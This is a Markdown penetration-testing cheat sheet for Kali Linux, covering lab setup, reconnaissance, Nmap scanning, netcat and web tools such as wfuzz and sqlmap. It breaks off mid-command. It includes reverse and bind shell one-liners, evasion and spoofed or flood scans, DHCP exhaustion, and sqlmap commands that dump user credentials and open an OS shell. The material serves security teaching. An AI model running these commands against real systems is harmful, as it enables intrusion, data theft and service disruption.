# Kali Linux — Complete Ethical Hacking & Penetration Testing Reference

## https://youtu.be/HkVfRImzhlA

> **Academic Use & Lab Only.** Every technique in this document is for educational purposes, authorized penetration testing on systems you own, and cybersecurity coursework. Unauthorized use against systems you do not own is illegal under computer crime laws worldwide.

---

## Table of Contents

1. [Environment Setup](#1-environment-setup)
2. [Linux Fundamentals](#2-linux-fundamentals)
3. [Information Gathering — Passive Reconnaissance](#3-information-gathering--passive-reconnaissance)
4. [Information Gathering — Active Reconnaissance](#4-information-gathering--active-reconnaissance)
5. [Network Scanning & Enumeration](#5-network-scanning--enumeration)
6. [Vulnerability Analysis](#6-vulnerability-analysis)
7. [Web Application Analysis](#7-web-application-analysis)
8. [Wireless Attacks](#8-wireless-attacks)
9. [Exploitation — Metasploit Framework](#9-exploitation--metasploit-framework)
10. [Exploitation — Standalone Tools](#10-exploitation--standalone-tools)
11. [Post-Exploitation & Maintaining Access](#11-post-exploitation--maintaining-access)
12. [Password Attacks](#12-password-attacks)
13. [Sniffing & Spoofing](#13-sniffing--spoofing)
14. [Denial of Service (DoS/DDoS)](#14-denial-of-service-dosddos)
15. [Social Engineering Toolkit (SET)](#15-social-engineering-toolkit-set)
16. [Forensics & Reporting Tools](#16-forensics--reporting-tools)
17. [Reverse Engineering](#17-reverse-engineering)
18. [Packet Crafting with Scapy](#18-packet-crafting-with-scapy)
19. [Lab Architecture — Practice Safely](#19-lab-architecture--practice-safely)
20. [Concepts Every CyberSec Student Must Know](#20-concepts-every-cybersec-student-must-know)

---

## 1. Environment Setup

### 1.1 Why Virtual Machines?

Using a VM for Kali Linux is the standard professional approach for learning and testing:

- **Isolation** — mistakes in the VM do not affect your host OS files
- **Snapshots** — roll back to a clean state after any destructive test
- **Networking control** — NAT, Host-Only, or Bridged modes give precise control over what the VM can reach
- **Full hardware access** — VM gets your CPU, RAM, and GPU resources directly

### 1.2 Kali Linux VMware Setup

```bash
# After downloading the official Kali VMware image from kali.org:
# 1. Extract the .7z archive
# 2. Double-click the .vmx file → opens directly in VMware
# 3. No installation needed — Kali boots immediately

# Default credentials (older images)
username: kali
password: kali

# Root login (if needed)
username: root
password: toor
```

### 1.3 Bootable USB with Persistence

Persistence means all changes you make (installed tools, captured data, configs) survive a reboot:

```bash
# Requirements:
# - Kali ISO from kali.org
# - USB drive ≥ 8 GB
# - Rufus (Windows) or dd (Linux) to write the image

# Using dd on Linux to write the ISO:
sudo dd if=kali-linux-2024-amd64.iso of=/dev/sdX bs=4M status=progress
# Replace /dev/sdX with your actual USB device — verify with lsblk first

# Boot menu options you will see:
# Live (amd64)              ← standard session, no persistence
# Live USB Persistence      ← changes saved to USB
# Live USB Encrypted Persistence
# Installer
# Forensic Mode             ← read-only, no automount (for forensics)
```

### 1.4 Metasploitable 2 — Intentionally Vulnerable Lab Target

Metasploitable 2 is the primary safe practice target. It runs dozens of vulnerable services:

```bash
# Download from: sourceforge.net/projects/metasploitable/
# Extract the .zip → open the .vmx in VMware
# Default credentials:
username: msfadmin
password: msfadmin

# After login, get IP address:
ifconfig
# Example output: eth0 inet addr: 192.168.154.131

# Recommended VMware network setting: Host-Only
# This means only your Kali VM can reach Metasploitable — not the internet
```

**Services running on Metasploitable 2 (partial list):**

| Port    | Service            | Known Vulnerability          |
| ------- | ------------------ | ---------------------------- |
| 21      | FTP (vsftpd 2.3.4) | Backdoor command execution   |
| 22      | SSH (OpenSSH 4.7)  | Weak credentials             |
| 23      | Telnet             | Clear-text, weak credentials |
| 80      | HTTP (Apache 2.2)  | DVWA, Mutillidae             |
| 139/445 | Samba              | Multiple CVEs                |
| 3306    | MySQL              | No root password             |
| 5432    | PostgreSQL         | Weak credentials             |
| 6667    | UnrealIRCd         | Backdoor                     |
| 8180    | Tomcat             | Default credentials          |

---

## 2. Linux Fundamentals

Mastering the terminal is non-negotiable in security work. Every tool in this document runs from the command line.

### 2.1 Navigation & File Management

```bash
# Print working directory
pwd

# List files (long format, hidden files)
ls -la

# Change directory
cd /var/log           # absolute path
cd ..                 # up one level
cd ~                  # home directory
cd -                  # previous directory

# Create and remove directories
mkdir myproject
rmdir myproject        # only works on empty dirs
rm -rf myproject       # force remove directory and contents

# Copy and move files
cp file.txt /tmp/file.txt
cp -r directory/ /tmp/ # recursive copy
mv file.txt newname.txt
mv file.txt /tmp/      # move to directory

# Remove files
rm file.txt
rm -f file.txt         # force (no prompt)

# Create files
touch newfile.txt
echo "content" > file.txt      # overwrite
echo "more content" >> file.txt # append

# View file contents
cat file.txt
less file.txt          # scrollable view (q to quit)
head -n 20 file.txt    # first 20 lines
tail -n 20 file.txt    # last 20 lines
tail -f /var/log/syslog # live follow (great for logs)
```

### 2.2 Search & Text Processing

```bash
# Find files
find / -name "passwd" 2>/dev/null
find /var -name "*.log" -mtime -7   # logs modified in last 7 days
find / -perm -4000 2>/dev/null      # find SUID binaries (privesc)

# Search text in files
grep "password" /etc/passwd
grep -r "secret" /var/www/          # recursive
grep -i "admin" access.log          # case insensitive
grep -v "GET" access.log            # invert match

# Text stream processing
cat /etc/passwd | cut -d: -f1       # extract usernames
cat file.txt | sort | uniq          # sort and deduplicate
cat file.txt | wc -l                # count lines
awk -F: '{print $1}' /etc/passwd    # awk field extraction
sed 's/old/new/g' file.txt          # find and replace
```

### 2.3 Networking Commands

```bash
# Interface configuration
ifconfig                            # legacy (still on Kali)
ip addr show                        # modern equivalent
ip link set eth0 up                 # bring interface up

# Routing
route -n                            # show routing table
ip route show
netstat -rn                         # another view

# Active connections
netstat -antup                      # all TCP/UDP + PIDs
ss -tulpn                           # modern equivalent

# DNS
host google.com                     # simple lookup
nslookup google.com
dig google.com                      # detailed DNS query
dig google.com MX                   # mail records
dig google.com NS                   # name servers
dig @8.8.8.8 google.com             # query specific DNS server

# Connectivity
ping -c 4 192.168.1.1               # 4 packets only
traceroute google.com
curl -I https://example.com         # HTTP headers only
wget https://example.com/file.zip   # download file
```

### 2.4 Process & System Management

```bash
# Processes
ps aux                              # all processes
ps aux | grep apache2
top                                 # live process viewer
htop                                # better live viewer
kill 1234                           # kill by PID
kill -9 1234                        # force kill
pkill apache2                       # kill by name

# Services
service apache2 start
service apache2 stop
service apache2 restart
service apache2 status
systemctl start ssh
systemctl enable ssh                # start on boot

# Permissions
chmod +x script.sh                  # make executable
chmod 755 file.sh                   # rwxr-xr-x
chmod 644 file.txt                  # rw-r--r--
chown root:root file.txt
chmod +s binary                     # set SUID bit

# Package management (Kali = Debian-based)
apt update                          # refresh package lists
apt upgrade                         # upgrade all packages
apt install nmap                    # install package
apt remove nmap
dpkg -i package.deb                 # install .deb file
dpkg -l                             # list installed packages
dpkg -L nmap                        # files installed by nmap
```

### 2.5 Archiving & Compression

```bash
# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip
unzip master.zip -d /destination/

# tar
tar -czf archive.tar.gz directory/  # create compressed
tar -xzf archive.tar.gz             # extract
tar -xjf archive.tar.bz2            # extract bz2

# gzip
gzip file.txt                       # creates file.txt.gz
gunzip file.txt.gz
zcat file.txt.gz | head             # view without extracting
```

---

## 3. Information Gathering — Passive Reconnaissance

Passive recon collects information **without directly interacting** with the target. No packets sent to the target means near-zero detection risk.

### 3.1 WHOIS — Domain Ownership Intelligence

```bash
# Basic WHOIS lookup
whois google.com
whois 172.217.0.0

# What you get:
# - Registrar name
# - Registration and expiry dates
# - Nameservers
# - Admin/tech contact details (often redacted now)
# - Organization name and address
# - IP ranges assigned to the org

# Example output fields to note:
# Registrant Organization: Google LLC
# Registrant State/Province: CA
# Name Server: NS1.GOOGLE.COM
# Updated Date: 2019-09-09
```

**Lab exercise:** Run `whois` on your own domain or university domain. Note what information is publicly visible.

### 3.2 The Harvester — Email & Subdomain Harvesting

```bash
# theHarvester is built into Kali
theharvester -d targetdomain.com -b google
theharvester -d targetdomain.com -b all -l 500

# Options:
# -d   target domain
# -b   data source: google, bing, linkedin, shodan, hunter, all
# -l   limit results to N
# -f   save output to file (HTML and XML)

# What it finds:
# - Email addresses (for phishing simulations or credential stuffing)
# - Subdomains
# - Hosts and IP addresses
# - Virtual hosts
```

### 3.3 DNS Enumeration Tools

#### DNSenum

```bash
# Full DNS enumeration
dnsenum google.com

# With options
dnsenum --threads 5 --dnsserver 8.8.8.8 targetdomain.com

# With Google scraping for subdomains
dnsenum --enum -p 5 --scrap targetdomain.com

# What it returns:
# - Host address (A records)
# - Name servers (NS records)
# - MX records (mail servers)
# - Zone transfer attempts (AXFR)
# - Subdomains via brute force
# - Reverse lookup on IP ranges
# - WHOIS on IP blocks
```

#### DNSrecon

```bash
# Standard enumeration
dnsrecon -d targetdomain.com

# Zone transfer attempt
dnsrecon -d targetdomain.com -t axfr

# Brute force subdomains with wordlist
dnsrecon -d targetdomain.com -D /usr/share/wordlists/dnsmap.txt -t brt

# Reverse lookup on IP range
dnsrecon -r 192.168.1.0/24

# Save results to XML
dnsrecon -d targetdomain.com --xml dnsrecon_results.xml

# SRV record enumeration (finds internal services)
dnsrecon -d targetdomain.com -t srv

# What record types to understand:
# A     → hostname to IPv4 address
# AAAA  → hostname to IPv6 address
# CNAME → alias to another hostname
# MX    → mail exchange server
# NS    → authoritative name server
# SOA   → start of authority (primary NS + admin)
# PTR   → reverse lookup (IP → hostname)
# SRV   → service location records
# TXT   → arbitrary text (SPF, DKIM, verification tokens)
```

#### Zone Transfer (AXFR) — Critical Misconfiguration

```bash
# A misconfigured DNS server will give you its ENTIRE zone database
# This reveals ALL subdomains and internal hostnames

# Attempt zone transfer
dig @ns1.targetdomain.com targetdomain.com AXFR
host -t axfr targetdomain.com ns1.targetdomain.com
dnsrecon -d targetdomain.com -t axfr

# If successful you see ALL records:
# mail.target.com      A   10.0.1.5
# dev.target.com       A   10.0.1.10
# vpn.target.com       A   10.0.1.20
# staging.target.com   A   10.0.1.30

# Why it matters: reveals internal network topology without any scanning
```

#### DNS Tracer

```bash
# Trace DNS query chain from root servers down
dnstracer -r3 -v targetdomain.com
# -r3   retry up to 3 times
# -v    verbose mode

# Shows how DNS resolution is delegated:
# Root → TLD (.com) → Authoritative NS → Answer
```

### 3.4 Subdomain Discovery

#### Subbrute

```bash
# Download and install
wget http://github.com/TheRookie/subbrute/archive/master.zip
unzip master.zip
cd subbrute-master/
python subbrute.py targetdomain.com
python subbrute.py -p targetdomain.com    # with resolvers
```

#### Knock

```bash
# Install
pip install knock --break-system-packages
# OR
git clone https://github.com/guelfoweb/knock.git

# Run
knockpy targetdomain.com
knockpy -w /path/to/wordlist.txt targetdomain.com

# Export results
knockpy -g targetdomain.com    # output as JSON
```

#### URL Crazy — Typosquatting Detection

```bash
urlcrazy targetdomain.com
urlcrazy -f targetdomain.com   # check domain popularity
urlcrazy -i targetdomain.com   # show invalid domains too

# Use cases:
# - Detect domains that impersonate your organization
# - Find phishing domains before victims do
# - Generate typo lists for awareness training
```

### 3.5 SSL/TLS Certificate Analysis

#### SSLyze

```bash
# Regular scan
sslyze --regular www.targetdomain.com

# Specific port
sslyze --regular www.targetdomain.com:8443

# What it checks:
# - SSL/TLS protocol versions supported (SSLv2, SSLv3, TLS 1.0-1.3)
# - Cipher suites (weak/strong)
# - Certificate validity, chain, and trust
# - HEARTBLEED vulnerability
# - CRIME attack vulnerability
# - Session renegotiation support
# - OCSP stapling
# - Session resumption
```

#### SSL Scan

```bash
sslscan www.targetdomain.com:443
sslscan --no-failed www.targetdomain.com:443  # only accepted ciphers

# Color-coded output:
# Red    = insecure (RC4, 3DES, SSLv2/3, NULL)
# Yellow = deprecated (TLS 1.0, 1.1, weak key)
# Green  = secure
```

### 3.6 Automater — Multi-Source OSINT

```bash
automater.py 192.168.1.1          # IP analysis
automater.py targetdomain.com     # domain analysis
automater.py d41d8cd98f00b204e9800998ecf8427e  # MD5 hash lookup

# Checks target against:
# ipvoid.com, robtex.com, fortiguard.com, unshorten.me
# urlvoid.com, labs.alienvault.com, ThreatExpert, VirusTotal
```

### 3.7 LBD — Load Balancing Detector

```bash
lbd targetdomain.com

# Detects DNS-based and HTTP-based load balancing
# Useful to know: different IPs may show different vulnerabilities
```

---

## 4. Information Gathering — Active Reconnaissance

Active recon **directly probes** the target. Packets are sent. This can be detected by IDS/IPS.

### 4.1 Ping & ICMP

```bash
# Standard ping
ping -c 4 192.168.1.1
ping -c 4 -i 0.2 192.168.1.1    # faster (0.2s interval)

# fping — ping multiple hosts simultaneously
fping -a 192.168.1.0/24 2>/dev/null    # show alive hosts
fping -g 192.168.1.0 192.168.1.255     # range
fping -f targets.txt                   # from file
fping -e google.com                    # show elapsed time

# Check if host is alive
fping -a -n google.com                 # by name
fping 8.8.8.8                          # by IP
```

### 4.2 NBTScan — NetBIOS Information

```bash
# Scan network for NetBIOS names (reveals Windows hostnames/usernames)
nbtscan 192.168.1.0/24
nbtscan -v 192.168.1.5       # verbose single host
nbtscan -f targets.txt       # from file

# Output columns:
# IP Address | NetBIOS Name | Server | User | MAC Address
```

### 4.3 Xprobe2 — OS Fingerprinting

```bash
# Active OS fingerprinting using ICMP
xprobe2 targethost.com
xprobe2 -l                   # list available modules
xprobe2 -d 11 targethost.com # disable ICMP module (useful when ICMP filtered)

# Returns probability-based OS detection:
# "Running OS: Linux 2.6.X (probability 95%)"
```

### 4.4 TCP Traceroute

```bash
# Standard UDP traceroute (often blocked by firewalls)
traceroute google.com

# TCP traceroute — bypasses most firewalls
# Sends TCP SYN packets instead of UDP/ICMP
tcptraceroute targetdomain.com           # default port 80
tcptraceroute targetdomain.com -p 443    # HTTPS
tcptraceroute google.com -f 2 -p 443    # start TTL at 2

# Why TCP traceroute works better:
# Firewalls often allow inbound TCP to specific ports
# TCP SYN looks like legitimate connection attempt
# Never completes 3-way handshake (RST sent by tcptraceroute)
# Same technique as Nmap -sS (stealth SYN scan)
```

### 4.5 HPing3 — Advanced Packet Crafting

```bash
# ICMP traceroute
hping3 --traceroute -V -1 targethost.com
# --traceroute  trace route mode
# -V            verbose
# -1            ICMP mode

# TCP SYN to specific port
hping3 -S -p 80 targethost.com         # SYN to port 80
hping3 -S -p 443 --flood targethost.com # flood (lab only)

# Custom packet options
hping3 -c 5 -d 120 -S -p 80 --scan 1-1000 targethost.com
# -c  packet count
# -d  data size in bytes
# -S  SYN flag

# Spoof source IP (requires raw socket / root)
hping3 -S -p 80 --spoof 1.2.3.4 targethost.com

# Firewall testing
hping3 -A -p 80 targethost.com    # ACK scan (firewall detection)
hping3 -F -p 80 targethost.com    # FIN scan
hping3 -p 80 targethost.com       # UDP
```

### 4.6 Netmask — Network Range Analysis

```bash
netmask -x google.com    # hex format
netmask -o google.com    # octal format
netmask -b google.com    # binary format (visualize subnet)

# Useful for: understanding network ranges, subnet planning
```

### 4.7 Dmitry — All-in-One Footprinting

```bash
# Full scan with output file
dmitry -o output google.com

# Specific modules:
dmitry -i google.com    # IP WHOIS
dmitry -w google.com    # domain WHOIS
dmitry -n google.com    # Netcraft info
dmitry -s google.com    # subdomain search
dmitry -e google.com    # email address search
dmitry -p google.com    # TCP port scan

# Combined (common approach):
dmitry -winse -o report.txt targetdomain.com
```

### 4.8 Enum4Linux — Windows/Samba Enumeration

```bash
# Full enumeration (equivalent to enum.exe on Windows)
enum4linux -a 192.168.1.5

# Specific modules:
enum4linux -U 192.168.1.5    # user list
enum4linux -S 192.168.1.5    # share list
enum4linux -P 192.168.1.5    # password policy
enum4linux -M 192.168.1.5    # machine list
enum4linux -G 192.168.1.5    # group list
enum4linux -o 192.168.1.5    # OS information

# What you can discover:
# Domain/workgroup name
# Local usernames (administrator, guest, etc.)
# Shared folders (including hidden admin shares)
# Password policy (min length, lockout threshold)
# OS version and build number
```

### 4.9 Miranda — UPnP Device Discovery

```bash
# Start with verbose mode on interface eth0
miranda -i eth0 -v

# Inside Miranda interactive shell:
msearch                  # discover UPnP devices
# (wait for responses — Ctrl+C to stop)

# UPnP devices that respond:
# Routers, smart TVs, printers, IoT devices
# Often reveal internal services, firmware versions, model numbers
```

---

## 5. Network Scanning & Enumeration

### 5.1 Nmap — The Core Scanner

Nmap is the most important active reconnaissance tool. Master every option.

#### Host Discovery

```bash
# Ping sweep — find live hosts (no port scan)
nmap -sn 192.168.1.0/24

# ARP ping (most reliable on local LAN)
nmap -sn -PR 192.168.1.0/24

# ICMP echo, timestamp, netmask pings combined
nmap -sn -PE -PP -PM 192.168.1.0/24

# TCP ping (when ICMP is blocked)
nmap -sn -PS80,443,22 192.168.1.0/24

# No ping — assume host is up (scan anyway)
nmap -Pn 192.168.1.5
```

#### Port Scanning Techniques

```bash
# SYN scan (stealth, default, requires root)
nmap -sS 192.168.1.5

# TCP connect scan (no root needed, more detectable)
nmap -sT 192.168.1.5

# UDP scan (slow but critical — DNS, SNMP, TFTP are UDP)
nmap -sU 192.168.1.5
nmap -sU -sS 192.168.1.5    # UDP + SYN combined

# FIN scan (bypasses some stateless firewalls)
nmap -sF 192.168.1.5

# Xmas scan (FIN, PSH, URG flags)
nmap -sX 192.168.1.5

# Null scan (no flags)
nmap -sN 192.168.1.5

# ACK scan (firewall rule mapping, not open/closed)
nmap -sA 192.168.1.5

# Window scan
nmap -sW 192.168.1.5

# Idle/Zombie scan (completely anonymous)
nmap -sI zombiehost:port 192.168.1.5
```

#### Port Selection

```bash
# Specific ports
nmap -p 22,80,443 192.168.1.5

# Port range
nmap -p 1-1024 192.168.1.5

# All 65535 ports
nmap -p- 192.168.1.5

# Top 100 most common ports (fast)
nmap -F 192.168.1.5

# All ports with UDP
nmap -p U:53,111,137,T:21-25,80,139,8080 192.168.1.5
```

#### Service & Version Detection

```bash
# Version detection
nmap -sV 192.168.1.5

# Intensity levels (0-9, default 7)
nmap -sV --version-intensity 9 192.168.1.5   # most aggressive

# OS detection
nmap -O 192.168.1.5
nmap -O --osscan-guess 192.168.1.5           # guess if unsure

# Combined: OS, version, scripts, traceroute
nmap -A 192.168.1.5

# Very aggressive fingerprint
nmap -A -T4 192.168.1.5
```

#### Timing Templates

```bash
# -T0  Paranoid   (very slow, IDS evasion)
# -T1  Sneaky     (slow, IDS evasion)
# -T2  Polite     (slows down, less bandwidth)
# -T3  Normal     (default)
# -T4  Aggressive (fast, assumes reliable network)
# -T5  Insane     (extremely fast, may miss results)

nmap -T4 -A 192.168.1.0/24    # typical pentest scan
nmap -T1 -sS 192.168.1.5       # IDS evasion
```

#### Nmap Scripting Engine (NSE)

```bash
# Run default scripts
nmap -sC 192.168.1.5
nmap --script=default 192.168.1.5

# Specific scripts
nmap --script=http-title 192.168.1.5
nmap --script=ftp-anon 192.168.1.5
nmap --script=smb-vuln-ms17-010 192.168.1.5    # EternalBlue check
nmap --script=smb-enum-users 192.168.1.5
nmap --script=ssh-brute 192.168.1.5
nmap --script=http-sql-injection 192.168.1.5

# Script categories
nmap --script=vuln 192.168.1.5               # all vulnerability scripts
nmap --script=exploit 192.168.1.5
nmap --script=auth 192.168.1.5               # authentication scripts
nmap --script=discovery 192.168.1.5
nmap --script=brute 192.168.1.5

# Wildcards
nmap --script=http-* 192.168.1.5             # all HTTP scripts
nmap --script=smb-* 192.168.1.5

# Combined aggressive scan with all vuln scripts
nmap -sS -sV -sC -O --script=vuln -T4 192.168.1.5

# Script help
nmap --script-help http-title
```

#### Evasion Techniques

```bash
# Fragment packets (bypass packet inspection)
nmap -f 192.168.1.5
nmap -ff 192.168.1.5    # 8-byte fragments

# Decoy scan (your real IP hidden among decoys)
nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.5

# Spoof MAC address
nmap --spoof-mac 0 192.168.1.5        # random MAC
nmap --spoof-mac Dell 192.168.1.5     # vendor prefix

# Randomize host order
nmap --randomize-hosts 192.168.1.0/24

# Slow scan to avoid detection
nmap -T1 --scan-delay 5s 192.168.1.5

# Use specific source port (appears as DNS traffic)
nmap --source-port 53 192.168.1.5
```

#### Saving Output

```bash
# Normal text output
nmap -oN results.txt 192.168.1.5

# XML output (for import into Metasploit, etc.)
nmap -oX results.xml 192.168.1.5

# Grep-able output
nmap -oG results.gnmap 192.168.1.5

# All formats at once
nmap -oA results 192.168.1.5    # creates .nmap, .xml, .gnmap

# Save to Metasploit database directly
# (inside Metasploit console)
db_nmap -sV -O 192.168.1.5
```

### 5.2 Zenmap — Nmap GUI

```bash
# Launch Zenmap
zenmap

# Predefined profiles:
# Intense scan:        nmap -T4 -A -v
# Intense scan + UDP:  nmap -sS -sU -T4 -A -v
# Ping scan:           nmap -sn
# Quick scan:          nmap -T4 -F
# Quick traceroute:    nmap -sn --traceroute
# Regular scan:        nmap
# Slow comprehensive:  nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53

# Creating custom profiles:
# Profile → Profile Editor → set your nmap flags → Save
```

### 5.3 Masscan — Internet-Speed Port Scanner

```bash
# Basic scan
masscan -p80 192.168.1.0/24

# Multiple ports
masscan -p80,443,22,3306 192.168.1.0/24

# Rate limiting (packets per second)
masscan -p80 192.168.1.0/24 --rate=10000

# Save results
masscan -p80,443 192.168.1.0/24 -oX results.xml

# Important: masscan uses its own TCP/IP stack
# Use -S option to specify a source IP different from your machine
# Or configure firewall to block RST responses from your kernel
```

### 5.4 Ncat (Netcat) — The Swiss Army Knife

```bash
# Listen on a port (act as server)
ncat -lvp 4444
# -l  listen mode
# -v  verbose
# -p  port

# Connect to a listener
ncat 192.168.1.5 4444

# Transfer files
# Receiver:
ncat -lvp 9999 > received_file.txt
# Sender:
ncat 192.168.1.5 9999 < file_to_send.txt

# Reverse shell (victim runs this, attacker listens)
# Attacker listens:
ncat -lvp 4444
# Victim executes:
ncat 192.168.1.100 4444 -e /bin/bash       # Linux
ncat 192.168.1.100 4444 -e cmd.exe         # Windows

# Bind shell (attacker connects to victim)
# Victim listens:
ncat -lvp 4444 -e /bin/bash
# Attacker connects:
ncat 192.168.1.5 4444

# Port scanning with ncat
ncat -zv 192.168.1.5 1-100    # scan ports 1-100

# Banner grabbing
echo "" | ncat 192.168.1.5 22    # grab SSH banner
echo "HEAD / HTTP/1.0\r\n\r\n" | ncat 192.168.1.5 80
```

### 5.5 Service Enumeration with Specific Tools

#### SNMP Enumeration

```bash
# SNMP uses UDP 161
# Community strings are like passwords (default: "public", "private")

# onesixtyone — fast SNMP scanner
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.0/24

# snmpwalk — enumerate all OIDs
snmpwalk -c public -v1 192.168.1.5
snmpwalk -c public -v2c 192.168.1.5 .1.3.6.1.2.1.1    # system info
snmpwalk -c public -v1 192.168.1.5 .1.3.6.1.2.1.25.4.2.1.2  # running processes

# snmpenum
snmpenum.pl 192.168.1.5 public /usr/share/snmpenum/linux.txt
```

#### DNS Map

```bash
# Find subdomains by brute force
dnsmap targetdomain.com
dnsmap targetdomain.com -w /usr/share/dnsmap/wordlist_TLAs.txt

# Save results
dnsmap targetdomain.com -r /tmp/results.txt
```

#### DN Map (Distributed Nmap)

```bash
# Server side
/usr/bin/dnmap_server -f commands.txt -p 46001
# commands.txt contains nmap commands, one per line:
# nmap -sS 192.168.1.0/24
# nmap -sV 10.0.0.0/24

# Client side (can run on multiple machines)
/usr/bin/dnmap_client -s 192.168.1.100 -a client_alias_name
```

---

## 6. Vulnerability Analysis

### 6.1 Lynis — Linux Security Auditing

```bash
# Full system audit
lynis audit system

# Quiet mode for cron
lynis -Q --cronjob

# Check specific tests
lynis audit system --tests-from-group authentication
lynis audit system --tests-from-group malware

# Output: /var/log/lynis.log
# Report: /var/log/lynis-report.dat

# What Lynis checks:
# - Installed software and versions
# - Configuration file security
# - File permissions
# - Account security (sudoers, PAM)
# - Kernel parameters
# - Firewall configuration
# - SSH configuration
# - SSL/TLS settings
# - Malware detection
# - Compliance (PCI-DSS, HIPAA guidelines)
```

### 6.2 Nikto — Web Server Vulnerability Scanner

```bash
# Basic scan
nikto -host www.targetsite.com

# Specify port
nikto -host 192.168.1.5 -port 8080

# Scan HTTPS
nikto -host https://www.targetsite.com

# Use authentication
nikto -host www.target.com -id admin:password

# Save report
nikto -host www.target.com -output report.html -Format html
nikto -host www.target.com -output report.txt -Format txt

# Specific plugin
nikto -host www.target.com -Plugins apacheusers

# Tune scan
# -Tuning 1  = Interesting files
# -Tuning 2  = Misconfiguration
# -Tuning 3  = Info disclosure
# -Tuning 4  = Injection (XSS/Script/HTML)
# -Tuning 5  = Remote file retrieval
# -Tuning 6  = Denial of service
# -Tuning 7  = Remote file retrieval (server root)
# -Tuning 8  = Command execution
# -Tuning 9  = SQL injection
nikto -host www.target.com -Tuning 4,9

# What Nikto finds:
# - Outdated software versions
# - Default credentials
# - Dangerous HTTP methods (PUT, DELETE, TRACE)
# - Missing security headers
# - Directory listings
# - Backup files (.bak, .old, .orig)
# - Debug pages
# - Admin panels
# - Known CVEs for detected software
```

### 6.3 Cisco-Specific Vulnerability Tools

#### Cisco Global Exploiter (CGE)

```bash
# List vulnerabilities by number
perl /path/to/cge.pl

# Test specific vulnerability
perl cge.pl 192.168.1.1 3   # Cisco IOS HTTP auth bypass
perl cge.pl 192.168.1.1 14  # HTTP DoS vulnerability

# Vulnerability list:
# 1  = 677/678 TNET buffer overflow
# 2  = IOS route denial of service
# 3  = IOS HTTP authentication bypass
# 4  = IOS HTTP command execution
# 5  = IOS HTTP /level/exec vulnerability
# 6  = IOS HTTP /level/16 vulnerability
# 7  = HTTP 1.1 DoS
# 8  = HTTP request DoS
# ...
```

#### Cisco Torch

```bash
# Scan all (fingerprint + service discovery)
cisco-torch -A 192.168.1.0/24

# Specific scans
cisco-torch -t 192.168.1.0/24    # TNET scan
cisco-torch -s 192.168.1.0/24    # SSH scan
cisco-torch -S 192.168.1.0/24    # SNMP scan
cisco-torch -w 192.168.1.0/24    # Web scan

# Dictionary attack on discovered services
cisco-torch -A -D /path/to/dict.txt 192.168.1.0/24
```

### 6.4 Asesor/Arenia (Yersinia) — Layer 2 Protocol Attacks

```bash
# Interactive mode
yersinia -I

# Graphical mode
yersinia -G

# Supported attack protocols:
# STP (Spanning Tree Protocol)  → claim root bridge, MITM
# CDP (Cisco Discovery Protocol) → flood, exhaust neighbor table
# DHCP                           → exhaustion, rogue server
# DTP (Dynamic Trunking Protocol) → enable trunking
# 802.1Q                         → VLAN hopping
# 802.1x                         → MITM with two interfaces
# VTP (VLAN Trunking Protocol)   → delete VLANs, crash switch
# HSRP (Hot Standby Router Protocol) → become active gateway

# Launch specific attack (example: DHCP exhaustion)
yersinia dhcp -attack 1 -interface eth0
```

---

## 7. Web Application Analysis

### 7.1 DirB — Web Content Discovery

```bash
# Basic directory bruteforce
dirb http://192.168.1.5/
dirb http://192.168.1.5/ /usr/share/wordlists/dirb/common.txt

# HTTPS
dirb https://www.target.com/

# With authentication
dirb http://target.com/ -u admin:password

# Specify extensions
dirb http://target.com/ -X .php,.html,.txt,.bak

# Ignore response codes
dirb http://target.com/ -N 404

# Save output
dirb http://target.com/ -o results.txt

# Recursive scanning
dirb http://target.com/ -r     # disable recursion

# Common wordlists in Kali:
# /usr/share/wordlists/dirb/common.txt         (4,614 entries)
# /usr/share/wordlists/dirb/big.txt            (20,469 entries)
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt (220,546)
```

### 7.2 WFuzz — Web Application Fuzzer

```bash
# Basic directory fuzzing (FUZZ is the injection point)
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://target.com/FUZZ

# Hide 404 responses
wfuzz -w wordlist.txt --hc 404 http://target.com/FUZZ

# Fuzz GET parameters
wfuzz -w wordlist.txt --hc 404 http://target.com/page.php?id=FUZZ

# Fuzz POST data
wfuzz -w wordlist.txt -d "username=admin&password=FUZZ" http://target.com/login.php

# Fuzz cookies
wfuzz -w wordlist.txt -b "session=FUZZ" http://target.com/

# Multiple injection points
wfuzz -w usernames.txt -w passwords.txt \
  -d "user=FUZZ&pass=FUZ2Z" http://target.com/login.php

# Filter by response size (hide specific sizes)
wfuzz -w wordlist.txt --hs "Not Found" http://target.com/FUZZ

# Show only certain response codes
wfuzz -w wordlist.txt --sc 200,301,302 http://target.com/FUZZ

# With color output and verbose
wfuzz -c -v -w wordlist.txt --hc 404 http://target.com/FUZZ
```

### 7.3 SQLMap — SQL Injection Testing

```bash
# Test URL for SQL injection
sqlmap -u "http://target.com/page.php?id=1"

# Test POST parameter
sqlmap -u "http://target.com/login.php" \
  --data="user=admin&pass=test"

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id

# Use cookie-based session
sqlmap -u "http://target.com/page.php?id=1" \
  --cookie="PHPSESSID=abc123"

# Enumerate databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://target.com/page.php?id=1" \
  -D database_name --tables

# Enumerate columns in specific table
sqlmap -u "http://target.com/page.php?id=1" \
  -D database_name -T table_name --columns

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" \
  -D database_name -T users -C username,password --dump

# Dump entire database
sqlmap -u "http://target.com/page.php?id=1" \
  -D database_name --dump-all

# Use random user-agent
sqlmap -u "http://target.com/page.php?id=1" \
  --random-agent

# Increase level and risk
sqlmap -u "http://target.com/page.php?id=1" \
  --level=5 --risk=3

# Technique flags
sqlmap -u "http://target.com/page.php?id=1" \
  --technique=BEUSTQ
# B = Boolean-based blind
# E = Error-based
# U = UNION query-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries

# OS shell (if stacked queries + file privs)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# Read local file
sqlmap -u "http://target.com/page.php?id=1" \
  --file-read=/etc/passwd

# Write file to server
sqlmap -u "http://target.com/page.php?id=1" \
